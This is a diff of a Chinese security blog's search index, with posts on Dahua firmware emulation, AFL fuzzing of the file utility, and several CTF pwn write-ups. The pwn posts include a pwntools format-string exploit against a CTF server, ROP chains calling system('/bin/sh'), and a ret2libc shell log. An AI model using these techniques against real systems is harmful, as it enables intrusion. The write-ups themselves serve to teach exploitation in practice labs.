+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/Z6tOb8zLnGCWwYF.png" alt="image-20211027154557847"></p>
+<p>用SaTC跑的过程</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/QIOrLYPCAc8aef6.png" alt="image-20211027155715171"></p>
+]]></content>
+      <tags>
+        <tag>IoT</tag>
       </tags>
   </entry>
   <entry>
@@ -862,78 +937,38 @@
       </tags>
   </entry>
   <entry>
-    <title>DaHuaFirmware_emulation</title>
-    <url>/2021/11/14/DaHuaFirmware-emulation/</url>
-    <content><![CDATA[<h1 id="大华固件模拟"><a href="#大华固件模拟" class="headerlink" title="大华固件模拟"></a>大华固件模拟</h1><p>用grep搜httpd的方式找到web服务启动脚本，为sonia，arm架构，小端可执行文件</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/tsbjLYCefXMHo3g.png" alt="image-20211114170159417"></p>
-<p>qemu用户模式去启动，发现报错，卡在了PDI_productGetHwidInfoByChip函数</p>
-<p><code>qemu-arm -L . ./bin/sonia</code></p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/no6VRXcf58ES2Jh.png" alt="image-20211114170325784"></p>
-<p>grep搜一下这个函数，发现此函数是在lib目录下名为libpdi.so的动态链接库文件中</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/9YcGfu4BVDiZXJw.png" alt="image-20211114170523467"></p>
-<p>把这个动态链接库反汇编然后查看这个PDI_productGetHwidInfoByChip函数，发现是存在一个死循环，推测我们是进入了这个循环所导致的</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/mIBZ4aPpfeYMugo.png" alt="image-20211114170856013"></p>
-<p>一开始我单独的去把while的死循环给patch掉了，可以管一时之用，但后面紧接着又报错很多其他类似上述死循环的函数，而且不太好改，推测它处于一个大范围的硬件函数中，因此我们这里可以查看谁调用了PDI_productGetHwidInfoByChip函数（但目前来说很多不太好确定是谁）或者把这个函数直接返回0（采用这种方式）</p>
-<p>把PDI_productGetHwidInfoByChip函数patch为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV.W R0, #0				</span><br><span class="line">BX LR</span><br></pre></td></tr></table></figure>
+    <title>Fuzz学习入门之Fuzzing-OpenEuler-file5.41</title>
+    <url>/2022/03/06/Fuzz%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B9%8BFuzzing-OpenEuler-file5-41/</url>
+    <content><![CDATA[<p>下载AFL</p>
+<p><code>git clone https://github.com/google/AFL.git</code></p>
+<p><strong>Tips：需要将AFL/llvm_mode目录下alf-clang-fast.c中131~134行的代码给去掉，不然编译的时候会报错</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081b92mkj21240u0ti7.jpg" alt="image-20220306154520627"></p>
+<p>在AFL下make生成fuzzer</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081a3npvj21730u0gy1.jpg" alt="image-20220306154652875"></p>
+<p>下载测试的项目：</p>
+<p><code>git clone https://gitee.com/src-openeuler/file.git</code></p>
+<p>把C和C++的编译器改为afl的afl-clang-fast和afl-clang-fast++</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/home/re1own/github/AFL/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=/home/re1own/github/AFL/afl-clang-fast++</span><br></pre></td></tr></table></figure>
 
-<p>上面的两段汇编相当于return 0，改完后PDI_productGetHwidInfoByChip函数是这样的，直接返回0了</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/zxZNJnMl9uhOavQ.png" alt="image-20211114171554787"></p>
-<p>改完后输出了很多的信息，但是在PDI_getChipInfo处卡住了</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/uRz1AE7LjeZSmrW.png" alt="image-20211114171819893"></p>
-<p>同样先grep，发现这个函数同样是在这个libpdi.so动态链接库中的，反汇编发现也是卡在了一个while(1)的死循环地方</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/48LklJQ7CEBr3Ds.png" alt="image-20211114171959990"></p>
-<p>查看它的调用，还是太多了，因此继续改，不过跟上面有点区别</p>
-<p>修改内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CBZ R0, loc_78C1C 修改为了B loc_78C1C</span><br><span class="line">MOV.W R0, #0xFFFFFFFF 修改为了MOV.W R0, #0</span><br></pre></td></tr></table></figure>
+<p>指定下安装目录</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=/home/re1own/Project/install/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/nw9maAoh3G7OD5b.png" alt="image-20211114172443175"></p>
-<p>改完后反汇编ok</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/W7BshL8mxprHGuS.png" alt="image-20211114172334752"></p>
-<p>输出的信息又多了一倍，卡在了函数PDI_productGetInfo处</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/OnLqWuMbSdyhJow.png" alt="image-20211114172553762"></p>
-<p>又是这种死循环，出错函数是PDI_productGetInfo</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jZsDyaKhSNmeL3Q.png" alt="image-20211114172911172"></p>
-<p>因为函数开头又很多寄存器，其实也可以直接覆盖用我们自己的return 0汇编指令，但最好还是间接，对arm不熟悉还是拿个中间跳板吧</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/nyht2CXPaBMpkd1.png" alt="image-20211114173152700"></p>
-<p>修改如下</p>
-<p>CBZ R0, loc_78F74 ——&gt;B loc_78F74</p>
-<p>MOV.W R0, #0xFFFFFFFF —&gt; MOV.W R0, #0</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/4wSZqKmuDGyTg2V.png" alt="image-20211114173952907"></p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jcZA3glotquMwWU.png" alt="image-20211114173940671"></p>
-<p>又卡住了，并且输出了上一次改动的地方旁边的信息</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/vNg2I6KhPr7eyUm.png" alt="image-20211114174159009"></p>
-<p>卡住的函数为PDI_productGetName，调用成功应该返回0</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/l6yJtKOfS1YZWbQ.png" alt="image-20211114174319545"></p>
-<p>同理修改</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/2wMbjzGtiKnsH9C.png" alt="image-20211114174645437"></p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/GwPOkrc13VMILzd.png" alt="image-20211114174657173"></p>
-<p>提示段错误</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/cjio9SZI3lPmFvt.png" alt="image-20211114174751221"></p>
-<p>查看有哪些调用了PDI_productGetName函数，发现挺多的，随便点进去几个看看</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jtD2KSYd7ozgckT.png" alt="image-20211114180035418"></p>
-<p>在PDI_getFaceboardCfg函数里发现原因就是调用PDI_productGetName函数时传进来的参数（作为PDI设备名字的）为空或者非法值导致的崩溃，返回值并没有错应该是0</p>
-<p>这个函数可以发现，下面如”SD6C80FA-GNX”、”SD6C82FA-GNX”等为合法的设备名字，如果我们在调用设备的时候给参数赋值为前面合法的值就好啦</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/RFoCSmvx8rf7Wls.png" alt="image-20211114175833570"></p>
-<p>同理其他调用者也可能会出现上述错误</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/WlkfCdpNzX1AZn7.png" alt="image-20211114180356461"></p>
-<p>在上述libpdi.so几个函数中依然没有找到是谁调用PDI_productGetName函数时产生的错误，因为我搜索最近的输出的信息的字符串并没有，因此推测可能是其他二进制文件调用了此函数产生的报错！去看看，grep找一下是谁，</p>
-<p>因此我们换一种角度，可能是别的二进制文件调用了此动态链接库的PDI_productGetName函数，因此去grep一下字符串”Video Server - (C) 2011-2013 ZheJiang Dahua Technology“果然有个sonia</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/s3QmNrznjyYKWxf.png" alt="image-20211114181559702"></p>
-<p>找到这段字符串的地址，进去看看调用它的函数</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/draDWGunb9vHsiM.png" alt="image-20211114181836068"></p>
-<p>函数sub_9BBA09就是输出蓝绿色字符串信息的函数了，但是它下面并没有调用出错的函数，查看调用它的函数只有sub_9BBAA2调用过它两次</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/XavHeb3l5STEVpw.png" alt="image-20211114181906342"></p>
-<p>总启动函数：sub_3B2F8</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/wfmZYVa1bdXhuDO.png" alt="image-20211114191306016"></p>
-<p>将出错的函数NOP掉直接乱了，似乎这样并不可取</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/xZq51YumJlKsDbU.png" alt="image-20211114191405670"></p>
-<p>但是这样能运行，只不过好像又卡了一个死循环，但这个死循环还没找到是在动态链接库libpdi.so的哪个地方</p>
-<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/v49hHzdKo3YnxjA.png" alt="image-20211114191515211"></p>
-<p>后续仍在研究中</p>
+<p>编译安装</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081c4ux2j21c00u0gs5.jpg" alt="image-20220306151917157"></p>
+<p>编译安装完之后可以发现在之前创建和制定的install目录下有了用AFL插桩生成的目标程序了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081arcmrj20zk09k3z2.jpg" alt="telegram-cloud-photo-size-5-6131935855611326493-y"></p>
+<p><code>strings file | grep &quot;afl&quot;</code>检查下是否插桩成功，字符串中有afl结合前面编译安装没有报错说明应该插桩成功了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081cnef3j20lm0l4goi.jpg" alt="image-20220306153619409"></p>
+<p>创建input、output文件夹，测试项目的tests文件下有输入文件，我们把它们转到input中当作种子，然后就可以用afl去fuzzing了</p>
+<p><code>afl-fuzz -i input -o output -m none -t 500+ -- /home/re1own/Project/install/bin/file @@</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081d4vn0j21c00u07bt.jpg" alt="image-20220306155011256"></p>
+<p>实验相关文件链接：<a href="https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41">https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41</a></p>
 ]]></content>
       <tags>
-        <tag>IoT</tag>
+        <tag>fuzz</tag>
+        <tag>OpenEuler</tag>
       </tags>
   </entry>
   <entry>
@@ -1007,6 +1042,21 @@
       <tags>
         <tag>IoT</tag>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN-64位ROP-Bugku_PWN4</title>
+    <url>/2020/11/24/PWN-64%E4%BD%8DROP-Bugku-PWN4/</url>
+    <content><![CDATA[<p>没有开任何保护<br><img width="357" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdacnb6ej30ju0ayq4d.jpg"></p>
+<p>反汇编很明显栈溢出<br><img width="947" alt="image" src="https://user-images.githubusercontent.com/51265145/111448765-b42ad380-8749-11eb-8852-c7ff57859d13.png"><br><img width="486" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdadd43cj30r00pqdix.jpg"></p>
+<p>然而只有System函数地址是已知的(0x400570)，参数”/bin/sh”未知<br>发现有$0(代表bash,做参数等同于”/bin/sh”)<br><img width="1435" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdaelmxfj31ot0u0n69.jpg"></p>
+<p>**特别注意:**32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数小于7的时候）<br>所以我们要找一个能够pop rdi的指令通过这句ROPgadget –binary pwn4 –only “pop|ret”可以找到，地址为0x4007d3<br><img width="769" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdafrko3j316q0h843s.jpg"></p>
+<p>用命令ROPgadget –binary pwn4 –string ‘$0’  找到$0的地址0x60111f<br><img width="649" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdaeriz4j310205uwfy.jpg"></p>
+<p>最后构造payload<br><img width="892" alt="image" src="https://user-images.githubusercontent.com/51265145/111448971-e89e8f80-8749-11eb-8371-a42936061572.png"><br><img width="644" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdafax04j30zs0fu766.jpg"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
       </tags>
   </entry>
   <entry>
@@ -1163,21 +1213,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN-64位ROP-Bugku_PWN4</title>
-    <url>/2020/11/24/PWN-64%E4%BD%8DROP-Bugku-PWN4/</url>
-    <content><![CDATA[<p>没有开任何保护<br><img width="357" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdacnb6ej30ju0ayq4d.jpg"></p>
-<p>反汇编很明显栈溢出<br><img width="947" alt="image" src="https://user-images.githubusercontent.com/51265145/111448765-b42ad380-8749-11eb-8852-c7ff57859d13.png"><br><img width="486" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdadd43cj30r00pqdix.jpg"></p>
-<p>然而只有System函数地址是已知的(0x400570)，参数”/bin/sh”未知<br>发现有$0(代表bash,做参数等同于”/bin/sh”)<br><img width="1435" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdaelmxfj31ot0u0n69.jpg"></p>
-<p>**特别注意:**32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数小于7的时候）<br>所以我们要找一个能够pop rdi的指令通过这句ROPgadget –binary pwn4 –only “pop|ret”可以找到，地址为0x4007d3<br><img width="769" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdafrko3j316q0h843s.jpg"></p>
-<p>用命令ROPgadget –binary pwn4 –string ‘$0’  找到$0的地址0x60111f<br><img width="649" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdaeriz4j310205uwfy.jpg"></p>
-<p>最后构造payload<br><img width="892" alt="image" src="https://user-images.githubusercontent.com/51265145/111448971-e89e8f80-8749-11eb-8371-a42936061572.png"><br><img width="644" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdafax04j30zs0fu766.jpg"></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PWN-pwnable.kr.fd</title>
     <url>/2020/11/24/PWN-pwnable-kr-fd/</url>
     <content><![CDATA[<p>第一次用这个oj，界面挺可爱的<br><img width="1628" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84iewij31l70u0n2e.jpg"></p>
@@ -1215,6 +1250,21 @@
 <p>反汇编后很明显是格式化字符串漏洞，printf(&amp;s)这种写法非常致命的,此题需要让全局变量pwnme变成8才可以<br><img width="703" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6y9ymkj30u00uigph.jpg"></p>
 <p>首先找偏移量:AAAA对应0x41414141,偏移量为10<br><img width="1200" alt="image" src="https://user-images.githubusercontent.com/51265145/111449933-d6712100-874a-11eb-8aee-086ff7b5d175.png"><br>因为没有开启PIE保护，全局变量的地址是不变的，查看是0x804A068<br><img width="924" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6wkflcj31fc0rcah2.jpg"></p>
 <p>EXP:<br><img width="948" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6xdhf8j31go0sqdn2.jpg"><br>当时困惑为什么payload要加上全局变量地址，后面理解了上图原理后，原来printf函数调用的时候会把数组的首地址压栈，因此写入的字符串前面得是四个字节的有效地址，否则会报错如下:<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6z3vagj309300yq2u.jpg" alt="image"><br>要想改变pwnme全局变量就得先找到pwnme所属的空间的首地址，通过printf固定的偏移量和格式化漏洞来修改pwnme的值</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN-格式化字符串-攻防世界_实时数据检测</title>
+    <url>/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/</url>
+    <content><![CDATA[<p>key是全局变量，需要将key改变为特殊值35795746才行<br><img width="512" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc5ppqpj30sg0hg0ut.jpg"></p>
+<p>格式化字符串原理图:<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc6j9s2j305s0aaaac.jpg" alt="image"></p>
+<p>可以看出AAAA偏离自己的首地址的地址(也就是format string)的偏移量为12<br><img width="822" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc7m0ivj319o09mq6p.jpg"></p>
+<p>key变量地址:<br><img width="412" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc6y4voj30mw0a8t9q.jpg"></p>
+<p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">33670</span>)</span><br><span class="line">key_addr = <span class="number">0x804A048</span>    <span class="comment">#这是key变量的地址</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>, &#123;key_addr:<span class="number">35795746</span>&#125;)   <span class="comment">#写偏移的新方法</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1277,21 +1327,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN-格式化字符串-攻防世界_实时数据检测</title>
-    <url>/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/</url>
-    <content><![CDATA[<p>key是全局变量，需要将key改变为特殊值35795746才行<br><img width="512" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc5ppqpj30sg0hg0ut.jpg"></p>
-<p>格式化字符串原理图:<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc6j9s2j305s0aaaac.jpg" alt="image"></p>
-<p>可以看出AAAA偏离自己的首地址的地址(也就是format string)的偏移量为12<br><img width="822" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc7m0ivj319o09mq6p.jpg"></p>
-<p>key变量地址:<br><img width="412" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc6y4voj30mw0a8t9q.jpg"></p>
-<p>EXP:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">33670</span>)</span><br><span class="line">key_addr = <span class="number">0x804A048</span>    <span class="comment">#这是key变量的地址</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>, &#123;key_addr:<span class="number">35795746</span>&#125;)   <span class="comment">#写偏移的新方法</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ROP-64位-ret2libc</title>
     <url>/2021/11/30/ROP-64%E4%BD%8D-ret2libc/</url>
     <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="stack5.zip">题目</a></p>
@@ -1327,50 +1362,6 @@
 
 <p>打通！</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack5]</span><br><span class="line">└─<span class="comment"># python2 exp.py </span></span><br><span class="line">[+] Opening connection to 47.94.239.235 on port 2025: Done</span><br><span class="line">0x7fb8d2262620</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$ cat home/ctf/flag</span><br><span class="line">flag&#123;a37e9c0d-234b-490f-bd63-5765e67dc12d&#125;$ </span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-        <tag>ROP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ROP-花式栈溢出stack_pivoting</title>
-    <url>/2021/11/29/ROP-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack-pivoting/</url>
-    <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="stack4">题目</a></p>
-<p>查看保护</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># checksec stack4 </span></span><br><span class="line">[*] <span class="string">&#x27;/home/stack_pivoting/stack4&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<p>程序会故意泄露buf的首地址（暂且不知道有啥用）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to stack4&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift: %p\n&quot;</span>, &amp;buf, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your name plz&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  print_name(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>print_name函数内部发生栈溢出，然而只是溢出了2个字节，不足以覆到返回地址</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, a1, <span class="number">0x32</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但是，因为main和print_name函数的栈帧差距较小，因此溢出的2个字节完全可以覆盖成泄露的buf的地址，从而改变了main函数的rbp，调用print_name函数快结束时，leave等同于mov rsp, rbp；pop rbp，此时rbp就是buf的首地址，然后retn等同于pop rip，回到main刚刚调用完print_name的地方，后面就是main函数的结束恢复帧栈空间了，同理，后面的leave会先把rsp赋值为rbp，这样rsp指向的就是buf了，然后再去pop ebp和ret操作就去执行了我们再buf中构造好的ROP chain啦！</p>
-<p>未覆盖时的栈帧结构</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high address      </span><br><span class="line">                        +--------------------+ &lt;--+ </span><br><span class="line">               +------&gt; |    previous rbp    |    |</span><br><span class="line">               |        +--------------------+    |</span><br><span class="line">               |        |       ......       |    |</span><br><span class="line">               |        +--------------------+    | main()</span><br><span class="line">               |        |        buf         |    |</span><br><span class="line">               |        +--------------------+    |</span><br><span class="line">               |        |   return address   |    |</span><br><span class="line">               |        +--------------------+ &lt;--+</span><br><span class="line">               +------- |    previous rbp    |    |</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |       ......       |    | print_name()</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |        dest        |    |</span><br><span class="line">                        +--------------------+ &lt;--+</span><br><span class="line">low address       </span><br></pre></td></tr></table></figure>
-
-<p>覆盖后的栈帧结构</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high address      </span><br><span class="line">                        +--------------------+      </span><br><span class="line">                        |    previous rbp    |     </span><br><span class="line">                        +--------------------+     </span><br><span class="line">                        |       ......       |     </span><br><span class="line">                        +--------------------+     </span><br><span class="line">                        |      ROP chain     |     </span><br><span class="line">                        +--------------------+ &lt;--+     </span><br><span class="line">               +------&gt; |        buf         |    |</span><br><span class="line">               |        +--------------------+    | main()</span><br><span class="line">               |        |   return address   |    |</span><br><span class="line">               |        +--------------------+ &lt;--+</span><br><span class="line">               +------- |    previous rbp    |    |</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |       ......       |    | print_name()</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |        dest        |    |</span><br><span class="line">                        +--------------------+ &lt;--+</span><br><span class="line">low address       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>因为是64位程序，传参是通过寄存器，所以得先<code>ROPgadget --binary stack4 --only &quot;pop|ret&quot; | grep rdi</code>获取到寄存器保存参数和ret的地址为0x4008a3</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack4 --only &quot;pop|ret&quot; | grep rdi</span></span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
-
-<p>获取”/bin/sh”的地址为0x4008c9，<code>ROPgadget --binary stack4 --string &quot;/bin/sh&quot;</code></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack4 --string &quot;/bin/sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008c9 : /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p>获取system的地址为0x40073a，<code>objdump -d stack4 | grep &#39;plt&#39;</code></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># objdump -d stack4 | grep &#x27;plt&#x27;</span></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line">00000000004005d0 &lt;.plt&gt;:</span><br><span class="line">00000000004005e0 &lt;puts@plt&gt;:</span><br><span class="line">  4005eb:       e9 e0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">00000000004005f0 &lt;setbuf@plt&gt;:</span><br><span class="line">  4005fb:       e9 d0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400600 &lt;system@plt&gt;:</span><br><span class="line">  40060b:       e9 c0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400610 &lt;<span class="built_in">printf</span>@plt&gt;:</span><br><span class="line">  40061b:       e9 b0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400620 &lt;<span class="built_in">read</span>@plt&gt;:</span><br><span class="line">  40062b:       e9 a0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400630 &lt;memcpy@plt&gt;:</span><br><span class="line">  40063b:       e9 90 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">  40073a:       e8 c1 fe ff ff          call   400600 &lt;system@plt&gt;</span><br><span class="line">  400761:       e8 